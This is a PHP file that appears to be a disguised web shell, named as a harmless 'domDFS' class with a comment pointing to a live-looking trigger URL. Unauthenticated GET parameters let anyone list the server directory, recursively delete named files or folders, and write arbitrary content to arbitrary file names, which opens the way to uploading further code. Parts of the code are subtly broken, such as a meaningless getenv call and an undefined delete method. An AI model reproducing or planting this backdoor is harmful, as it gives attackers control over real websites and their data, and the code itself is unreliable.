<?php 
//TRY THIS URL: http://www.jafr.net/jafr/DOM.php?FILENAMEFOUND=SUCCESS
    class domDFS {
	
	public function fileCreateName($fileName,$content) {
	$fileLocation = getenv("./") . $fileName;
	$file = fopen($fileLocation,"w");
	fwrite($file,$content);
	fclose($file);
	return $fileLocation;}
	

	public function fileDirName() {
	$allFileDir = scandir('./');
	echo "<pre>";
	print_r($allFileDir);
	echo "</pre>";}
	
	
	public function sucess_done($pFile) {
	if (is_dir($pFile)) {
	array_map(function($value) {
	$this->delete($value);
	rmdir($value);
	},glob($pFile . '/*', GLOB_ONLYDIR));
	$result=array_map('unlink', glob($pFile."/*"));
	}else{$result=unlink($pFile);}
	return $result;
	}}



	if($_GET['FILENAMEFOUND']=='SUCCESS'){
	$new_way_solution = new domDFS;
	$new_way_solution->fileDirName();
	echo "<hr/><p>Add Below URL To GET SUCESS</p>";
	echo "?FILENOFOUND=SUCCESS&FILENAME=<b>FILENAME</b>  For File Delete"."<br/>";
	echo "?FILECREATE=SUCCESS&FILENAME=<b>FILENAME</b>&CONTENT=<b>YOUR TEXT CONTENT</b>  For File Create";
	}
	
	
	
	if($_GET['FILENOFOUND']=='SUCCESS'){
	$fileDir=$_GET['FILENAME'];	
	$new_way_solution = new domDFS;
	$result=$new_way_solution->sucess_done($fileDir);
	if($result==1){
	echo "<h1>SUCCESS</h1>";
	}else{ echo "<pre>";
	print_r($result);
	echo "</pre>";}}
	
	
	if($_GET['FILECREATE']=='SUCCESS'){
	$fileDir=$_GET['FILENAME'];
	$fileContent=$_GET['CONTENT'];		
	$new_way_solution = new domDFS;
	$result=$new_way_solution->fileCreateName($fileDir,$fileContent);	
	echo "<b>File Created Successfully:</b>".$fileDir;
    }
?>